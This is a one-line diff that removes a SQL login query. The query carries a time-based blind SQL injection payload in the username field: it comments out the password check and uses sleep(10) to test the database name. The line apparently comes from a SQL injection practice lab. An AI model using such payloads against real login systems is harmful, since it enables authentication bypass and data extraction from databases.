@@ -1,1 +1,0 @@
-SELECT username, password FROM users WHERE username='admin ' AND if((select database() = "securityS"),sleep(10),NULL) #' and password='$passwd' LIMIT 0,1
